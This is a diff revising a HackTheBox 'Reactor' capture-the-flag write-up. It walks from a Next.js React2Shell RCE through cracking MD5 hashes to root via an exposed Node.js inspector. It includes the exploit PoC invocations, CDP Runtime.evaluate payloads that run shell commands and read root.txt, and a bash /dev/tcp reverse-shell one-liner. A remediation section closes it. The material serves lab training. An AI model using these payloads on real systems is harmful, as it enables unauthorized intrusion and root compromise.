@@ -5,92 +5,98 @@ parent: HTB Writeups
 nav_order: 1
 ---
 
-# HTB Reactor — Full Writeup
+# HTB Reactor
 
-**Machine:** Reactor (Linux) · **Difficulty:** Medium · **Attack Surface:** 2 ports — 22 (SSH), 3000 (HTTP)
+**Machine:** Reactor (Linux) · **Difficulty:** Medium · **Attack surface:** SSH (22), HTTP (3000)
+
+Reactor is a straight line from a headline-grade framework CVE to root, but the fun part is the middle: it buries the real privilege-escalation path under a handful of deliberately tempting dead ends. Getting from "shell as the app user" to "root" is less about exploitation skill and more about not chasing the group membership that *looks* like the vuln.
 
 ---
 
 ## 1. Recon & Fingerprinting
 
-Nmap surfaced only SSH and a web service on 3000. The root page is a fake nuclear monitoring dashboard — **"REACTORWATCH — Core Monitoring System v3.2.1"** — built on **Next.js 15.0.3 (App Router)**.
+An nmap scan turns up exactly two open ports: SSH and a web service on 3000. The web root is a fake nuclear-plant monitoring dashboard — **"REACTORWATCH — Core Monitoring System v3.2.1"** — styled convincingly enough to be a distraction in its own right, but the interesting part is underneath it: it's built on **Next.js 15.0.3** using the App Router.
 
-Fingerprinting came straight from the page source: `self.__next_f.push(...)` blocks — RSC Flight payloads serializing the entire dashboard (metrics, logs, personnel). No credentials in it, but it confirmed the stack and gave up the build ID.
+The page source gives this away immediately. Next.js's React Server Components ship their payload as `self.__next_f.push(...)` blocks — serialized "Flight" data containing the dashboard's metrics, logs, and personnel records, all rendered server-side and streamed down as part of the initial HTML. None of it contained credentials, but it confirmed the framework, the App Router usage, and the build ID, which is exactly the fingerprint needed to know whether this box is sitting in a vulnerable version range.
 
-Wordlist fuzzing of `/_next/static/` (feroxbuster) confirmed the standard webpack chunks; nothing hidden beyond the obvious app.
+A pass with feroxbuster against `/_next/static/` turned up nothing beyond the expected webpack chunks — no hidden routes, no stray build artifacts. The web app itself wasn't going to be attacked through content discovery; it was going to be attacked through its framework.
 
 ---
 
 ## 2. Initial Foothold — React2Shell (CVE-2025-55182)
 
-Next.js **15.0.3** sits in the vulnerable range for **React2Shell** — the pre-auth RCE in the React Flight decoder (prototype pollution via crafted `then`/`__proto__` keys in Server Action payloads → arbitrary module load → `child_process` execution). Affected: Next.js 15.0.x–16.0.x running React 19 with RSC; fixed in 15.0.5+.
+Next.js 15.0.3 falls inside the vulnerable range for **React2Shell (CVE-2025-55182)**, a pre-auth, unauthenticated RCE in React Server Components with a CVSS score of 10.0. It affects the `react-server-dom-*` packages (versions 19.0–19.2.0) and every framework that bundles them — Next.js, React Router, Waku, and others — because the flaw lives in React's own Flight deserialization code, not in anything framework-specific.
 
-A public PoC (`exploit-redirect.sh`) was used with **HTTP 303 redirect exfiltration** — command output rides back in the `Location` header, which sidesteps blind-RCE pain entirely.
+The root cause is a missing ownership check. When a client invokes a Server Action, React serializes the reference to it as a string like `module-id#export-name`. On the server, Next.js resolves that by loading the module via `__webpack_require__` and then indexing into its exports object with bracket notation — `moduleExports[name]` — to find the function to call. The bug is that this lookup never verifies the requested name is actually one of the module's *own* declared exports. That means an attacker can request *any* property reachable off that object, including methods inherited from built-in Node modules already present in the bundle — `child_process.execSync`, `fs.readFileSync`, `vm.runInThisContext`, and so on. A crafted Server Action reference is enough to turn "call this component's action" into "call this arbitrary Node API," with attacker-controlled arguments.
+
+For exploitation I used a public proof-of-concept (`exploit-redirect.sh`) built around an HTTP 303 redirect for output exfiltration: rather than dealing with a blind RCE where you have no return channel, the command's output gets reflected back in the response's `Location` header, so each request is self-contained — send a command, read the header, done.
 
 ```bash
 ./exploit-redirect.sh http://10.129.154.181:3000/ "id"
 ./exploit-redirect.sh http://10.129.154.181:3000/ "ls -la /opt/reactor-app"
 ```
 
-**Shell as the Node app user.** Confirmed files: `app/`, `next.config.js`, `package.json`, `reactor.db`, `.env`.
+This returned a shell as the Node application user, running out of `/opt/reactor-app`, with `app/`, `next.config.js`, `package.json`, `reactor.db`, and `.env` all present and readable.
 
 ---
 
-## 3. Loot — `.env` & Database
+## 3. Loot — `.env` and the SQLite Database
 
-### `.env`
+The `.env` file in the app directory held the expected environment config, plus two things worth a closer look:
 
 | Key | Value |
 |-----|-------|
 | `DB_PATH` | `/opt/reactor-app/reactor.db` |
 | `DB_TYPE` | `sqlite3` |
 | `SENSOR_API_KEY` | `rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k` |
-| `ALERT_WEBHOOK` | `https://alerts.internal.reactor.htb/webhook` *(red herring)* |
+| `ALERT_WEBHOOK` | `https://alerts.internal.reactor.htb/webhook` |
 | `NODE_ENV` | `production` |
 
-### `reactor.db` (SQLite) — `users` table
+`SENSOR_API_KEY` looked promising at first, but nothing on the box consumed it outside the app itself, and `ALERT_WEBHOOK` pointed at an internal hostname that was never in `/etc/hosts` and never resolved — both turned out to be flavor text rather than a path forward.
+
+The database pointed to by `DB_PATH` was more useful. Pulling `reactor.db` and opening its `users` table surfaced two accounts:
 
 | id  | username | password_hash (MD5)                | role          |
 | --- | -------- | ---------------------------------- | ------------- |
 | 1   | admin    | `a203b22191d7xxxxxxxxxa5c101b17b8` | administrator |
 | 2   | engineer | `39d97110eafexxxxxxxxx812cd271e8e` | operator      |
 
-Cracked with **John the Ripper**:
+Both hashes are unsalted MD5, which is effectively asking to be cracked. John made short work of it:
 
 ```bash
 john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 john --show --format=Raw-MD5 hashes.txt
 ```
 
-`admin`'s hash never fell. `engineer`'s did — and worked over **SSH → shell as `engineer`**. (Admin's password, wherever it lives, wasn't needed.)
+`admin`'s hash never fell against rockyou, but `engineer`'s did, and the recovered password worked directly over SSH. That was enough — the admin account's credentials, wherever they actually lived, were never needed for the rest of the chain.
 
 ---
 
 ## 4. Privesc Triage — Distinguishing Signal from Noise
 
-Engineer enumeration produced several red herrings:
+Once on the box as `engineer`, the usual enumeration pass turned up several things that looked like the intended privilege-escalation path but weren't:
 
-| Finding                                                       | Verdict                                                                                                           |
-| ------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
-| `lxd` group membership + writable `/run/lxd-installer.socket` | **Decoy** — LXD not installed; snap install requires internet (blocked). `lxc version` just errored via the shim. |
-| `/etc/crontab`, systemd timers                                | All stock Ubuntu — nothing planted                                                                                |
-| `ALERT_WEBHOOK` internal hostname                             | Not in `/etc/hosts`, never resolvable — flavor text                                                               |
+| Finding | Verdict |
+| --- | --- |
+| `engineer` is a member of the `lxd` group, and `/run/lxd-installer.socket` is writable | **Decoy.** LXD isn't actually installed, and installing it via snap requires outbound internet access, which is blocked from the box. `lxc version` just errors out through the installer shim — there's no running LXD daemon to abuse. |
+| `/etc/crontab` and systemd timers | Stock Ubuntu, nothing custom planted. |
+| `ALERT_WEBHOOK`'s internal hostname | Unresolvable, as noted above — a loose end left over from the `.env` file, not a lead. |
 
-**The real signal** in `ss -tlnp`:
+The actual signal was buried in a `ss -tlnp` listing:
 
 ```
-LISTEN  127.0.0.1:9229   ← Node.js V8 Inspector (--inspect)
+LISTEN  127.0.0.1:9229
 ```
 
-Loopback-only, and `ss` shows no owning process (different user's proc) — a debug port left open on a *separate, more privileged* Node process.
+Port 9229 is the default for the Node.js V8 Inspector (`--inspect`). It's loopback-only, and `ss` doesn't show an owning process for it under `engineer`'s session — meaning it belongs to a separate, more privileged Node process running elsewhere on the box. A debug port left open in anything resembling a production environment is almost always exploitable, and this one was no exception.
 
 ---
 
 ## 5. Root — Node.js Inspector RCE via SSH Tunnel
 
-### Summary
+### The idea
 
-A Node.js process runs with the inspector enabled on `127.0.0.1:9229` (loopback only). The Chrome DevTools Protocol (CDP) spoken over that port allows `Runtime.evaluate` — arbitrary JavaScript execution inside the running process — which trivially becomes command execution as the process owner. Access requires an SSH local port forward from an authenticated session as `engineer`.
+The V8 Inspector speaks the Chrome DevTools Protocol (CDP). Any client that can reach it can issue `Runtime.evaluate` — arbitrary JavaScript execution inside that running Node process — which trivially becomes command execution as whatever user owns it. Since the port is bound to loopback, reaching it from outside the box requires tunneling it through the existing SSH session as `engineer`.
 
 ### 5.1 Tunnel the inspector port
 
@@ -98,9 +104,7 @@ A Node.js process runs with the inspector enabled on `127.0.0.1:9229` (loopback 
 ssh -N -L 9229:127.0.0.1:9229 engineer@10.129.154.181
 ```
 
-- `-N` = no shell, no command — the session sits there silently **by design**. It's not hanging; it's holding the tunnel open. Use a second terminal for everything else.
-- Verify the tunnel: `curl http://127.0.0.1:9229/json`
-- To add a forward to an existing session: **Enter**, then `~C` (escape sequence only works at a fresh line start), then `-L 9229:127.0.0.1:9229`.
+`-N` means no remote command and no shell — the session just sits there holding the tunnel open. That's expected, not a hang; everything else happens from a second terminal. Verify the forward is live with `curl http://127.0.0.1:9229/json`. (To add this forward to an already-open SSH session instead of starting a new one: press Enter to get to a fresh line, then type `~C` to drop into the SSH command line, then `-L 9229:127.0.0.1:9229`.)
 
 ### 5.2 Discover the debugger endpoint
 
@@ -109,20 +113,13 @@ curl -s http://127.0.0.1:9229/json | jq -r '.[0].webSocketDebuggerUrl'
 # ws://127.0.0.1:9229/55f079fd-0d26-4eb1-974b-6126050222b2
 ```
 
-The `/json` endpoint also reveals the app `title` and script `url` — note the path for source review later.
+The same `/json` response also includes the inspected process's `title` and script `url`, which is worth noting if you want to review the target app's source afterward.
 
-### 5.3 Attach over WebSocket (CDP)
+### 5.3 Attach over WebSocket and evaluate
 
-`websocat` isn't packaged for Debian. Equivalent options:
+`websocat` isn't packaged on Debian by default, so the practical options are: `apt install python3-websocket` and drive it from a small Python script, `npx wscat -c <url>` if npm is available, a static `websocat` binary from GitHub releases, or just pointing a desktop Chromium at `chrome://inspect` → Configure → `127.0.0.1:9229` and using the GUI.
 
-| Tool | Install |
-|---|---|
-| `python3-websocket` | `sudo apt install python3-websocket` |
-| `wscat` | `npx wscat -c <url>` (needs npm) |
-| `websocat` static binary | GitHub releases (musl build) |
-| Chromium GUI | `chrome://inspect` → Configure → `127.0.0.1:9229` |
-
-**Python REPL** — auto-fetches the UUID, handles `awaitPromise` and error display:
+I used a small Python REPL that fetches the debugger UUID automatically and handles `awaitPromise` plus error reporting:
 
 ```python
 #!/usr/bin/env python3
@@ -150,24 +147,23 @@ while True:
         print(res["result"].get("value"))
 ```
 
-Raw websocket workflow (wscat/websocat): each line is one CDP message.
+If you're driving `wscat`/`websocat` directly instead, each line sent over the socket is one CDP message. A sanity check first:
 
-Sanity check:
 ```json
 {"id":1,"method":"Runtime.evaluate","params":{"expression":"1+1","returnByValue":true}}
 ```
 
-**RCE:**
+And then the actual RCE:
 
 ```json
 {"id":2,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('id; hostname').toString()","returnByValue":true}}
 ```
 
-Output lands in `.result.result.value`.
+The output lands in `.result.result.value` of the response. If the target process has no `process.mainModule` (ESM-only entry points don't), the dynamic-import fallback works just as well because `awaitPromise: true` is set: `import('child_process').then(cp=>cp.execSync('id').toString())`.
 
-ESM fallback (no `mainModule`): `import('child_process').then(cp=>cp.execSync('id').toString())` — works because `awaitPromise:true`.
+### 5.4 Post-exploitation
 
-### 5.4 Post-exploitation checklist
+From there it's a normal post-exploitation pass, just expressed as JS expressions sent over the socket instead of shell commands:
 
 ```js
 process.mainModule.require('child_process').execSync('id').toString()      // whoami
@@ -176,24 +172,28 @@ process.env                                                                // se
 process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()
 ```
 
-- Check the process user (`ps aux | grep node`) — RCE runs as whoever owns Node, which may not be `engineer`
-- Review app source at the `url` from `/json` for hardcoded creds
-- Enumerate loopback-only services reachable from the Node host
+Worth checking along the way:
+- The actual process owner (`ps aux | grep node` from a normal shell, if you have one) — the RCE runs as whoever owns that Node process, which isn't guaranteed to be `root` on every box built like this one.
+- The app source at the `url` reported by `/json`, in case it has hardcoded credentials worth reviewing.
+- Any other loopback-only services reachable from the Node host, since this one was.
 
-Or upgrade to a full TTY reverse shell from the console:
+For anything beyond one-off commands, it's less painful to pop a full reverse shell from the console and work from a real TTY:
+
 ```js
 process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/<VPN_IP>/4444 0>&1"')
 ```
 
-### 5.5 Gotchas encountered
+### 5.5 Gotchas along the way
 
-- **"SSH hangs"** → `-N` behavior, not a bug; no prompt will ever appear
-- **`~C` printed literally** → must be first chars on a fresh line (Enter first)
-- **Truncated UUID** → terminal line-wrap; the WS path is a full 36-char UUID, copy via `jq`, not by eye
-- **UUID rotates** on every app restart → re-fetch `/json`
-- **Connects but no reply** → started with `--inspect-brk`; send `{"id":0,"method":"Debugger.resume"}` first
-- **Immediate rejection** → Node allows one debugger client; kill other attached sessions
-- **`curl --ws` useless here** → Debian builds curl without WebSocket support
+A few things cost time during this step and are worth flagging:
+
+- **"SSH just hangs"** — that's `-N` working as intended; no prompt is ever coming, use the second terminal.
+- **`~C` prints literally instead of opening the SSH command line** — the escape sequence only works as the first characters typed after a fresh line; press Enter first.
+- **The WebSocket UUID looks truncated when copied by eye** — it's just terminal line-wrapping; pull it with `jq` rather than trying to read it off the screen.
+- **The UUID changes** every time the inspected process restarts — re-fetch `/json` rather than reusing a cached URL.
+- **Connected but no response to `Runtime.evaluate`** — the process was likely started with `--inspect-brk` and is paused at the first line; send `{"id":0,"method":"Debugger.resume"}` first.
+- **Connection immediately rejected** — Node's inspector only accepts one debugger client at a time; make sure nothing else (e.g. an open Chromium `chrome://inspect` tab) is still attached.
+- **`curl --ws` doesn't work here** — the Debian-packaged curl build doesn't include WebSocket support; don't waste time on it.
 
 ---
 
@@ -202,27 +202,29 @@ process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/<
 ```
 nmap: 22 + 3000
    └─ Next.js 15.0.3 (App Router, RSC/webpack)
-        └─ CVE-2025-55182 (React2Shell) — pre-auth RCE via Flight decoder
-             └─ RCE as node app user (redirect-exfil PoC)
-                  ├─ .env        → SENSOR_API_KEY, ALERT_WEBHOOK (red herrings)
-                  └─ reactor.db  → MD5 hashes
+        └─ CVE-2025-55182 (React2Shell) — pre-auth RCE via Flight module-export resolver
+             └─ RCE as the Node app user (redirect-exfil PoC)
+                  ├─ .env        → SENSOR_API_KEY, ALERT_WEBHOOK (both dead ends)
+                  └─ reactor.db  → MD5 password hashes
                        └─ john (Raw-MD5 + rockyou) → engineer's password
                             └─ SSH as engineer
-                                 └─ ss -tlnp → 127.0.0.1:9229 (Node --inspect)
+                                 └─ ss -tlnp → 127.0.0.1:9229 (Node --inspect, not lxd)
                                       └─ SSH tunnel → CDP Runtime.evaluate
                                            └─ root → root.txt
 ```
 
 ---
 
-## 7. Remediation (for the report)
+## 7. Remediation
 
-1. **Upgrade Next.js** past 15.0.5 (ideally latest 15.x/16.x) — CVE-2025-55182 is network-exploitable pre-auth with CVSS 10.0.
-2. **Never run Node with `--inspect` in production** — or bind it to a socket that isn't reachable from other service accounts. This was the entire privesc.
-3. **Stop using unsalted MD5 for credentials** — cracked in seconds against rockyou.
-4. **Rotate `SENSOR_API_KEY`** — it was exposed in `.env` alongside a reachable RCE; treat it as compromised.
-5. **Don't leave group-membership escape hatches** (`lxd` group with no LXD installed) — not exploitable here, but a standing risk.
+1. **Upgrade Next.js off 15.0.3.** CVE-2025-55182 is unauthenticated, network-exploitable, and rated CVSS 10.0 — about as bad as a web vulnerability gets. The 15.0.x branch is fixed from 15.0.5 onward; other branches have their own patched releases (15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7), so the fix needs to track whichever minor line is actually deployed, not just "bump to the next patch." Given the severity, this should have triggered an out-of-band patch cycle rather than waiting for a normal release window.
+2. **Never run Node with `--inspect` in a production or production-like environment.** This single misconfiguration was the entire path from a low-privilege app-adjacent account to root. If a debugger needs to be attached for troubleshooting, it should be enabled transiently and torn down immediately after — not left listening indefinitely, even on loopback, where any other local account can reach it.
+3. **Stop hashing credentials with unsalted MD5.** Both hashes in `reactor.db` were crackable in seconds against a stock rockyou wordlist. At minimum this should be bcrypt/scrypt/argon2 with a per-user salt; MD5 offers essentially no resistance against offline cracking on modern hardware.
+4. **Treat `SENSOR_API_KEY` as compromised and rotate it.** It sat in a `.env` file reachable through a remote code execution vulnerability; even though it wasn't the key that led anywhere in this chain, any secret exposed alongside an RCE should be assumed read and rotated as a matter of course.
+5. **Audit group memberships against what's actually installed.** `engineer` being in the `lxd` group with no LXD daemon present isn't exploitable today, but it's a standing landmine — the moment someone installs LXD for an unrelated reason, that account escalates to root with zero additional effort. Group membership should match actual need, not leftover provisioning.
 
 ---
 
-*Flags obtained: user.txt (engineer), root.txt (root via Node inspector). All actions performed on an authorized HackTheBox machine.*
+*Flags obtained: user.txt (as `engineer`), root.txt (root via the Node inspector). All actions performed against an authorized HackTheBox machine.*
+
+Sources on CVE-2025-55182: [Checkmarx](https://checkmarx.com/zero-post/react2shell-cve-2025-55182-deserialization-to-remote-code-execution-in-react-and-next-js/) · [Rapid7](https://www.rapid7.com/blog/post/etr-react2shell-cve-2025-55182-critical-unauthenticated-rce-affecting-react-server-components/) · [Wiz](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182)
